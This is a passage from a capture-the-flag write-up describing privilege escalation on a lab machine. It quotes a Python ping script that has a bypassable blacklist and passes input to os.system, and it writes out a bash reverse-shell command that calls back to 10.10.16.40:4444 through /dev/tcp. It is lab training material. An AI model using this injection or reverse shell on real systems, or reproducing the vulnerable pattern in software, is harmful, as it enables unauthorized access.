For a while, I searched password string in tons of php files, however, I couldn't find any interesting information. However, glancing at sudo -l output, I found vector which lead us to shell with pepper.

Generally speaking, I should have tried the sudo -l command because it's better to finish easy task. I wasted time doing stupid seeking.

We can run the python script as user pepper.

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

Also, the code snippet uses dangerous function os.system(...). We might use it for privilege escalation.

Though it blacklist several characters, we can still use '$', '(' and ')'.

※From a blue team perspective, it is more secure to whitelist certain extensions, instead of trying to blacklist all potenrially malicious ones.

Therefore, if we can make a rev-shell file and execute it within code expantion, we can gain shell with pepper.

www-data@jarvis:/var/www/Admin-Utilities$ echo "bash -c 'bash -i >& /dev/tcp/10.10.16.40/4444 0>&1'" > /tmp/revshell.sh
www-data@jarvis:/var/www/Admin-Utilities$ chmod +x /tmp/revshell.sh
